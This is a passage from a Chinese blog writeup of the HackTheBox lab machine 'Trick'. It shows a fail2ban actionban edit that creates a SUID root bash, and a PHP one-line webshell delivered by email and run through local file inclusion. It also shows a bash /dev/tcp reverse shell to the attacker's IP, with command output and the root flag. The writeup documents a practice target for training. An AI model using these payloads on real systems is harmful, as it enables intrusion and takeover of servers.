iptables-ipset-proto6.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1420 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-multiport.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2082 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-multiport-log.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1497 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-new.conf<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 2584 </span>Sep<span class="hljs-number"> 25 </span>10:18 iptables-xt_recent-echo.conf<br>michael@trick:/etc/fail2ban/action.d$ <br></code></pre></td></tr></table></figure>

<p>30、我们可以写入iptables-multiport.conf文件，然后重新启动Fail2Ban服务</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>fail2ban<span class="hljs-regexp">/action.d/i</span>ptables-multiport.conf<br><br>actionban = cp <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/tmp &amp;&amp; chmod 4755 /</span>tmp/bash<br><br>sudo <span class="hljs-regexp">/etc/i</span>nit.d/fail2ban restart<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:/etc/fail2ban/action</span>.d<span class="hljs-variable">$ </span>sudo /etc/init.d/fail2ban restart<br><span class="hljs-symbol">sh:</span> <span class="hljs-number">0</span>: getcwd() <span class="hljs-symbol">failed:</span> <span class="hljs-title class_">No</span> such file <span class="hljs-keyword">or</span> directory<br>[ ok ] <span class="hljs-title class_">Restarting</span> fail2ban (via systemctl): fail2ban.service.<br></code></pre></td></tr></table></figure>

<p>31、然后，我们查看下是否存在shell了</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span>ls -la ./bash <br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">1168776</span> <span class="hljs-title class_">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span> ./bash<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:/tmp</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>

<p>32、可以了，那就直接切换吧</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">michael@trick:/tmp$ ./bash -p<br>bash-5.0<span class="hljs-comment"># id</span><br>uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)<br>bash-5.0<span class="hljs-comment"># cd /root/</span><br>bash-5.0<span class="hljs-comment"># ls -la</span><br>total 56<br>drwx------ <span class="hljs-number"> 8 </span>root root<span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 25 </span>04:18 .<br>drwxr-xr-x<span class="hljs-number"> 19 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 9 </span>Apr<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 570 </span>Jan<span class="hljs-number"> 31 </span><span class="hljs-number"> 2010 </span>.bashrc<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.cache<br>drwx------ <span class="hljs-number"> 5 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.config<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 139 </span>Apr<span class="hljs-number"> 22 </span><span class="hljs-number"> 2022 </span>f2b.sh<br>drwxr-xr-x <span class="hljs-number"> 6 </span>root root<span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 12 </span><span class="hljs-number"> 2022 </span>fail2ban<br>drwx------ <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.gnupg<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.local<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 148 </span>Aug<span class="hljs-number"> 17 </span><span class="hljs-number"> 2015 </span>.profile<br>-rw-r----- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 33 </span>Sep<span class="hljs-number"> 25 </span>04:18 root.txt<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 66 </span>Jun <span class="hljs-number"> 7 </span><span class="hljs-number"> 2022 </span>.selected_editor<br>-rwxr-xr-x <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1342 </span>Jun <span class="hljs-number"> 7 </span><span class="hljs-number"> 2022 </span>set_dns.sh<br>drwx------ <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>.ssh<br>bash-5.0<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p>33、查看下根flag信息</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span># cat root.txt <br><span class="hljs-attribute">dad9ade99ebd3289cf5378b8564a5ba8</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">5</span>.<span class="hljs-number">0</span># <br></code></pre></td></tr></table></figure>

<p>34、其实我用的方法都是非预期的提权，通过查看演练报告，发现预期的方法</p>
<p>35、这台机器的预期路径是利用端口 25。我知道 michael 是该机器上的用户。它在文件中。我也&#x2F;etc&#x2F;passwd可以使用以下命令验证这个名称：smtp-user-enum</p>
<p>36、这里的构思是发送一个带有PHP的一句话木马邮件，然后使用本地包含去包含呢个邮件内容，产生一个WEBSHELL</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo swaks -t michael --<span class="hljs-keyword">from</span> shiyan --server <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> --body <span class="hljs-string">&quot;111111&quot;</span> --header <span class="hljs-string">&quot;Subject: Staging Script&quot;</span><br>[sudo] kali 的密码：<br>=== Trying <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span>:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span>.<br>&lt;-  <span class="hljs-number">220</span> debian.localdomain ESMTP Postfix (Debian/GNU)<br> -&gt; EHLO offsec<br>&lt;-  <span class="hljs-number">250</span>-debian.localdomain<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">10240000</span><br>&lt;-  <span class="hljs-number">250</span>-VRFY<br>&lt;-  <span class="hljs-number">250</span>-ETRN<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-DSN<br>&lt;-  <span class="hljs-number">250</span>-SMTPUTF8<br>&lt;-  <span class="hljs-number">250</span> CHUNKING<br> -&gt; MAIL FROM:&lt;shiyan&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> Ok<br> -&gt; RCPT TO:&lt;michael&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> Ok<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Wed, <span class="hljs-number">25</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">17</span>:<span class="hljs-number">12</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0800</span><br> -&gt; To: michael<br> -&gt; From: shiyan<br> -&gt; Subject: Staging Script<br> -&gt; Message-Id: &lt;<span class="hljs-number">20240925171246.198163</span>@offsec&gt;<br> -&gt; X-Mailer: swaks v20240103<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; <span class="hljs-number">111111</span><br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Ok: queued <span class="hljs-keyword">as</span> <span class="hljs-number">42</span>BEC4099C<br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure>

<p>37、然后去查看</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">view-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael</span><br><br><span class="hljs-string">From</span> <span class="hljs-string">shiyan@debian.localdomain</span>  <span class="hljs-string">Wed</span> <span class="hljs-string">Sep</span> <span class="hljs-number">25</span> <span class="hljs-number">11</span><span class="hljs-string">:02:01</span> <span class="hljs-number">2024</span><br><span class="hljs-attr">Return-Path:</span> <span class="hljs-string">&lt;shiyan@debian.localdomain&gt;</span><br><span class="hljs-attr">X-Original-To:</span> <span class="hljs-string">michael</span><br><span class="hljs-attr">Delivered-To:</span> <span class="hljs-string">michael@debian.localdomain</span><br><span class="hljs-attr">Received:</span> <span class="hljs-string">from</span> <span class="hljs-string">offsec</span> <span class="hljs-string">(unknown</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.22</span>]<span class="hljs-string">)</span><br>	<span class="hljs-string">by</span> <span class="hljs-string">debian.localdomain</span> <span class="hljs-string">(Postfix)</span> <span class="hljs-string">with</span> <span class="hljs-string">ESMTP</span> <span class="hljs-string">id</span> <span class="hljs-string">42BEC4099C</span><br>	<span class="hljs-string">for</span> <span class="hljs-string">&lt;michael&gt;;</span> <span class="hljs-string">Wed,</span> <span class="hljs-number">25</span> <span class="hljs-string">Sep</span> <span class="hljs-number">2024 11:02:01</span> <span class="hljs-string">+0200</span> <span class="hljs-string">(CEST)</span><br><span class="hljs-attr">Date:</span> <span class="hljs-string">Wed,</span> <span class="hljs-number">25</span> <span class="hljs-string">Sep</span> <span class="hljs-number">2024 17:12:46</span> <span class="hljs-string">+0800</span><br><span class="hljs-attr">To:</span> <span class="hljs-string">michael</span><br><span class="hljs-attr">From:</span> <span class="hljs-string">shiyan</span><br><span class="hljs-attr">Subject:</span> <span class="hljs-string">Staging</span> <span class="hljs-string">Script</span><br><span class="hljs-attr">Message-Id:</span> <span class="hljs-string">&lt;20240925171246.198163@offsec&gt;</span><br><span class="hljs-attr">X-Mailer:</span> <span class="hljs-string">swaks</span> <span class="hljs-string">v20240103.0</span> <span class="hljs-string">jetmore.org/john/code/swaks/</span><br><br><span class="hljs-number">111111</span><br><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/14.png" srcset="/img/loading.gif" lazyload></p>
<p>38、然后继续</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo swaks -t michael --<span class="hljs-keyword">from</span> shiyan --server <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span> --header <span class="hljs-string">&quot;test001&quot;</span> --body <span class="hljs-string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#x27;</span><br>=== Trying <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span>:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.166</span>.<br>&lt;-  <span class="hljs-number">220</span> debian.localdomain ESMTP Postfix (Debian/GNU)<br> -&gt; EHLO offsec<br>&lt;-  <span class="hljs-number">250</span>-debian.localdomain<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">10240000</span><br>&lt;-  <span class="hljs-number">250</span>-VRFY<br>&lt;-  <span class="hljs-number">250</span>-ETRN<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-DSN<br>&lt;-  <span class="hljs-number">250</span>-SMTPUTF8<br>&lt;-  <span class="hljs-number">250</span> CHUNKING<br> -&gt; MAIL FROM:&lt;shiyan&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> Ok<br> -&gt; RCPT TO:&lt;michael&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> Ok<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Wed, <span class="hljs-number">25</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">17</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span> +<span class="hljs-number">0800</span><br> -&gt; To: michael<br> -&gt; From: shiyan<br> -&gt; Subject: test Wed, <span class="hljs-number">25</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">17</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span> +<span class="hljs-number">0800</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20240925171536.199562</span>@offsec&gt;<br> -&gt; X-Mailer: swaks v20240103<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; test001<br> -&gt; <br> -&gt; &lt;?php <span class="hljs-keyword">system</span>($_REQUEST[<span class="hljs-string">&quot;cmd&quot;</span>]); ?&gt;<br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Ok: queued <span class="hljs-keyword">as</span> <span class="hljs-number">906</span>C94099C<br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">view-source:http:<span class="hljs-regexp">//</span>preprod-marketing.trick.htb<span class="hljs-regexp">/index.php?page=..../</span><span class="hljs-regexp">/..../</span><span class="hljs-regexp">/..../</span><span class="hljs-regexp">/..../</span><span class="hljs-regexp">/var/m</span>ail/michael&amp;cmd=id<br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/15.png" srcset="/img/loading.gif" lazyload></p>
<p>39、直接反弹利用</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">view</span>-source:http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&amp;cmd=bash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Fdev%<span class="hljs-number">2</span>Ftcp%<span class="hljs-number">2</span>F<span class="hljs-number">10.10.14.22</span>%<span class="hljs-number">2</span>F443%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>

<p><img src="http://sh1yan.top/photo/Trick-htb-writeup/16.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(kali㉿offsec)-[~/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-variable">$ </span>nc -lvnp <span class="hljs-number">443</span>       <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.22</span>] from (<span class="hljs-title class_">UNKNOWN</span>) [<span class="hljs-number">10.10</span>.<span class="hljs-number">11.166</span>] <span class="hljs-number">33334</span><br><span class="hljs-symbol">bash:</span> cannot set terminal process group (<span class="hljs-number">724</span>): <span class="hljs-title class_">Inappropriate</span> ioctl <span class="hljs-keyword">for</span> device<br><span class="hljs-symbol">bash:</span> no job control <span class="hljs-keyword">in</span> this shell<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:/var/www/market</span><span class="hljs-variable">$ </span>id<br>id<br>uid=<span class="hljs-number">1001</span>(michael) gid=<span class="hljs-number">1001</span>(michael) groups=<span class="hljs-number">1001</span>(michael),<span class="hljs-number">1002</span>(security)<br>michael<span class="hljs-variable">@trick</span><span class="hljs-symbol">:/var/www/market</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>

<p>40、然后就获取到了初始shell，这里是因为一直自动清空邮件，导致得不断的下发邮件。</p>
<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/477</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Trick-htb-writeup</div>
      <div>https://sh1yan.top/2024/09/25/Trick-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年9月25日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/09/26/Driver-htb-writeup/" title="Driver-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Driver-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/24/Shoppy-htb-writeup/" title="Shoppy-htb-writeup">
                        <span class="hidden-mobile">Shoppy-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
